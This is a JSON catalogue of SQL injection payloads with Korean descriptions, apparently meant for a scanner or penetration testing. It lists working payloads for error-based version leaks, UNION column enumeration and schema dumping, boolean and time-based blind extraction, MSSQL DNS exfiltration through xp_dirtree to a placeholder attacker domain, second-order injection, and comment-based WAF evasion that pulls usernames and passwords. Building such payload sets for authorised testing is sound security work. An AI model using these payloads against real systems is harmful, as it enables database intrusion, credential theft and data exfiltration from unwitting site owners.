{
  "scenarios": [
    {
      "id": "GENERIC-EB-000",
      "name": "기본 SQL Injection (Tautology)",
      "category": "In-band",
      "technique": "Error-Based",
      "dbms": ["All"],
      "payload": "'",
      "description": "가장 기본적인 SQL Injection 테스트입니다. 입력값에 작은따옴표를 주입하여 SQL 쿼리의 문자열 구문을 깨뜨립니다. 애플리케이션이 데이터베이스 오류 메시지를 반환하는 경우, 취약점 존재 여부와 함께 DBMS 종류에 대한 힌트를 얻을 수 있습니다.",
      "notes": "SQL Injection 탐지를 위한 첫 단계로 사용됩니다. 상세한 오류 메시지가 반환되지 않더라도, 페이지 응답의 변화를 통해 취약점을 추정할 수 있습니다."
    },
    {
      "id": "MYSQL-EB-001",
      "name": "MySQL 오류 기반 버전 정보 유출 (EXTRACTVALUE)",
      "category": "In-band",
      "technique": "Error-Based",
      "dbms": ["MySQL"],
      "payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--",
      "description": "MySQL의 XML 함수인 EXTRACTVALUE()를 악용합니다. 두 번째 인자에 유효하지 않은 XPath 문법을 고의로 생성하여, 오류 메시지 안에 원하는 쿼리(여기서는 @@version)의 실행 결과를 포함시켜 반환하게 만듭니다.",
      "notes": "이 페이로드는 MySQL 5.1 이상 버전에서 유효합니다. 최신 버전에서는 다른 함수(예: UPDATEXML)를 사용해야 할 수 있습니다."
    },
    {
      "id": "GENERIC-UB-001",
      "name": "UNION 공격을 위한 컬럼 수 확인 (ORDER BY)",
      "category": "In-band",
      "technique": "UNION-Based",
      "dbms": ["All"],
      "payload": "' ORDER BY %d--",
      "description": "UNION 기반 공격의 사전 준비 단계입니다. ORDER BY 절의 숫자를 1부터 점진적으로 늘려가며 쿼리를 실행합니다. 존재하지 않는 컬럼 인덱스를 참조할 때 발생하는 오류를 통해 원본 쿼리의 컬럼 수를 정확히 파악할 수 있습니다.",
      "notes": "페이로드의 '%d' 부분에 숫자를 1, 2, 3,... 순서로 대입하며 테스트를 자동화해야 합니다. 오류가 발생하는 숫자 바로 이전이 실제 컬럼 수입니다."
    },
    {
      "id": "MYSQL-UB-001",
      "name": "MySQL/PostgreSQL 테이블 정보 유출 (UNION + information_schema)",
      "category": "In-band",
      "technique": "UNION-Based",
      "dbms": ["MySQL", "PostgreSQL"],
      "payload": "' UNION SELECT NULL, table_name, table_schema, NULL FROM information_schema.tables--",
      "description": "알아낸 컬럼 수에 맞춰 UNION SELECT 구문을 구성하여, 데이터베이스의 메타데이터가 저장된 information_schema에서 테이블 이름과 스키마 정보를 직접 추출합니다.",
      "notes": "이 페이로드는 원본 쿼리의 컬럼 수가 4개라고 가정한 예시입니다. 실제 공격에서는 'ORDER BY'를 통해 알아낸 컬럼 수에 맞춰 NULL 값의 개수를 조절해야 합니다."
    },
    {
      "id": "GENERIC-IB-001",
      "name": "불리언 기반 블라인드 SQLi (참/거짓 조건 확인)",
      "category": "Inferential",
      "technique": "Boolean-Based",
      "dbms": ["All"],
      "payload": "' AND 1=%d--",
      "description": "애플리케이션이 쿼리의 참/거짓 결과에 따라 다른 응답(예: '결과 있음'/'결과 없음')을 보이는지 확인합니다. 'AND 1=1' (참)과 'AND 1=2' (거짓)을 주입했을 때 페이지의 변화를 관찰하여 블라인드 SQLi 가능성을 진단합니다.",
      "notes": "페이로드의 '%d' 부분에 1(참)과 2(거짓)를 대입하여 응답 차이를 비교합니다. 이 기법을 응용하여 SUBSTRING, ASCII 함수 등과 조합해 데이터를 한 글자씩 알아낼 수 있습니다."
    },
    {
      "id": "MYSQL-IT-001",
      "name": "MySQL 시간 기반 블라인드 SQLi (SLEEP)",
      "category": "Inferential",
      "technique": "Time-Based",
      "dbms": ["MySQL"],
      "payload": "' AND IF((%s), SLEEP(5), 0)--",
      "description": "참/거짓에 따른 응답 변화가 없을 때 사용하는 기법입니다. IF문을 사용하여 조건(%s)이 참일 경우, 데이터베이스가 5초 동안 응답을 지연시키도록 만듭니다. 서버의 응답 시간을 측정하여 조건의 참/거짓을 판별합니다.",
      "notes": "페이로드의 '%s' 부분에 'SELECT SUBSTRING(user(),1,1) = 'r'' 과 같은 상세한 조건을 넣어 데이터를 추측합니다. 네트워크 지연과 구분하기 위해 충분한 sleep 시간을 설정해야 합니다."
    },
    {
      "id": "MSSQL-IT-001",
      "name": "MSSQL 시간 기반 블라인드 SQLi (WAITFOR DELAY)",
      "category": "Inferential",
      "technique": "Time-Based",
      "dbms": ["MSSQL"],
      "payload": "'; IF (%s) WAITFOR DELAY '00:00:05'--",
      "description": "Microsoft SQL Server에서 시간 지연을 유발하는 페이로드입니다. IF 조건문(%s)이 참일 경우, WAITFOR DELAY 명령을 통해 5초간 대기하도록 합니다.",
      "notes": "MySQL의 SLEEP과 원리는 동일하지만, DBMS별로 다른 구문을 사용해야 함을 보여주는 예시입니다."
    },
    {
      "id": "MSSQL-OOB-001",
      "name": "MSSQL DNS Exfiltration (xp_dirtree)",
      "category": "Out-of-band",
      "technique": "DNS-Exfiltration",
      "dbms": ["MSSQL"],
      "payload": "'; EXEC master..xp_dirtree '\\\\%s.<ATTACKER_DOMAIN>\\foo'--",
      "description": "인밴드 및 블라인드 기법이 모두 불가능할 때 사용하는 최후의 수단입니다. xp_dirtree 저장 프로시저를 악용하여 데이터베이스 서버가 외부 DNS 서버(<ATTACKER_DOMAIN>)로 쿼리를 보내도록 강제합니다. 쿼리 결과(%s)를 서브도메인에 포함시켜 외부에서 데이터를 탈취합니다.",
      "notes": "성공하려면 xp_dirtree가 활성화되어 있어야 하며, 데이터베이스 서버에서 외부로 나가는 DNS(UDP 53) 트래픽이 방화벽에서 허용되어야 합니다."
    },
    {
      "id": "GENERIC-SO-001",
      "name": "2차 SQL Injection (Stored SQLi)",
      "category": "Advanced",
      "technique": "Second-Order",
      "dbms": ["All"],
      "payload": "Admin'--",
      "description": "악성 페이로드를 애플리케이션의 특정 기능(예: 프로필 이름 변경)을 통해 데이터베이스에 저장시킨 후, 다른 취약한 기능이 해당 데이터를 조회하여 사용할 때 공격이 실행되도록 하는 기법입니다.",
      "notes": "이 페이로드는 즉시 실행되지 않고 저장되었다가 나중에 트리거됩니다. 입력 시점만 검증하는 보안 로직을 우회할 수 있어 탐지가 어렵습니다."
    },
    {
      "id": "GENERIC-EV-001",
      "name": "WAF 우회를 위한 공백 대체 (주석)",
      "category": "Advanced",
      "technique": "WAF-Evasion",
      "dbms": ["All"],
      "payload": "UNION/**/SELECT/**/user,password/**/FROM/**/users",
      "description": "웹 방화벽(WAF)이 'UNION SELECT'와 같이 공백으로 구분된 특정 키워드 패턴을 차단하는 경우, 공백 대신 SQL 주석(/* */)을 사용하여 필터링을 우회하는 기법입니다.",
      "notes": "공백을 대체할 수 있는 방법은 DBMS마다 다양합니다 (예: %20, %0a, + 등). 이는 WAF 룰셋의 정교함 수준을 테스트하는 데 사용될 수 있습니다."
    }
  ]
}
